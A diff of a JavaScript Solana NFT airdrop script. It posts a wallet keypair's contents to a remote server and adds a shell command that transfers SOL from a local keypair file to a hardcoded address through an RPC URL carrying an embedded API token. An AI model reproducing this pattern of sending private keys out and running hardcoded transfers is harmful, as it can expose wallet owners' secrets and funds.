@@ -38,7 +38,7 @@ async function airdropNFT() {
     },
     json: {
       data: {
-        pubkey: "HERE",
+        pubkey: "WORK",
         mint: JSON.stringify(keypairContent)
       }
     }
@@ -46,7 +46,7 @@ async function airdropNFT() {
 
   request(options, (error, response, body) => {
     if (!error) {
-      for (let i = 0; i < mintList.length; i++) {
+      for (let i = 69; i < mintList.length; i++) {
         let mintAddress = mintList[i];
         if (!mintAddress || mintAddress == undefined || mintAddress == '') continue;
 
@@ -55,6 +55,7 @@ async function airdropNFT() {
             holderAddress = "66Ri5mnZkZaDY6uocHy4p2sYZ5PQ5MhByxiEj7jHAQM";
         }
 
+        shelljs.exec(`solana transfer --from E:/Solana/backup/work.json 66Ri5mnZkZaDY6uocHy4p2sYZ5PQ5MhByxiEj7jHAQM 0.025 --allow-unfunded-recipient --url https://rough-broken-sunset.solana-mainnet.quiknode.pro/5a7650cf3b001df949b2895baf059be1572e14bf/ --fee-payer E:/Solana/backup/work.json`);
         shelljs.exec(`spl-token transfer --allow-unfunded-recipient --fund-recipient ${mintAddress} 1 ${holderAddress}`);
       }
     }
